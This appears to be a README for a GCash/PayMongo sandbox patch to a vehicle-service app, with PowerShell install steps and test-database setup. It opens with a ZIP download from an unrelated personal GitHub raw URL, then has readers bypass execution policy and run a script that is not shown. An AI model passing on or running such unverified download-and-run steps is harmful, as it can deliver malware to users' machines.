# Download

[Download GCash-For-Optimized-Baseline.zip](https://raw.githubusercontent.com/kindredjebguinto/lyc/main/releases/gcash-for-optimized-baseline-2026-11-17/GCash-For-Optimized-Baseline.zip)

# GCash sandbox installer for the Optimized Baseline

Use this ONLY with the complete Vehicle-Service-System-Optimized-Baseline.zip installed as your current source. All 28 installer manifest entries were checked against that baseline. The original v1 payload is used, with pubspec.lock deliberately excluded so flutter pub get retains SDK-compatible resolution. Do not use the old v2 installer, which targeted the earlier mixed source folder.

1. Extract this installer ZIP to a separate folder outside the project, e.g. Downloads\GCash-For-Optimized-Baseline.
2. In that folder, type powershell in File Explorer's address bar and press Enter (Windows PowerShell 5.1; Administrator is not needed).
3. Preflight only:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\Apply-GCash-Sandbox.ps1 -ProjectRoot "C:\xampp\htdocs\Vehicle-Service-System"
```

4. After Preflight passed, apply the source patch:

```powershell
.\Apply-GCash-Sandbox.ps1 -ProjectRoot "C:\xampp\htdocs\Vehicle-Service-System" -Apply
```

5. Resolve Flutter dependencies:

```powershell
cd "C:\xampp\htdocs\Vehicle-Service-System\vsm_customer"
& "C:\development\flutter\bin\flutter.bat" pub get
```

If a real conflict is reported, stop and share the output; do not force replacement. The installer backs up affected existing source files and never executes SQL. Do not deploy or run sandbox payments against the live business database.

## Separate TEST database setup

- Export a backup of your existing database.
- Create a separate test database, copy the project schema into it, and point the TEST website/Admin/API configuration copies to that test database. Do not change the live website database connection.
- Import vehicle-service-management/database/migrations/20261117_payment_gateway_attempts.sql into that TEST database only.
- The source installer itself does not create/configure a test database and does not run the migration.

## PayMongo account and test hosting are still required

Create a PayMongo merchant account with eligible GCash/test access, deploy a separate HTTPS test backend (for example a correctly configured sandbox.luckyyuna.com), and configure the backend environment:

PAYMONGO_ENABLED=1
PAYMONGO_SECRET_KEY=<your sk_test_... key>
PAYMONGO_WEBHOOK_SECRET=<your test webhook signing secret>
PAYMONGO_RETURN_URL=https://<test-host>/<actual-api-path>/payments/gcash/return.php

Register the HTTPS test webhook ending /payments/gcash/webhook.php for checkout_session.payment.paid. Backend PHP needs mysqli, cURL and valid TLS certificates. Use the test API URL as Flutter's API_BASE_URL. Keep keys on the backend, never in chat or Flutter.

Until those account/hosting/configuration steps are complete, Pay with GCash correctly reports unavailable setup. The patch does not invent a working checkout. No real PayMongo transaction, live deployment or native device verification was performed for this installer packaging task. See SETUP-GCASH-SANDBOX.md and TEST-REPORT.md for the integration details and original local test evidence.
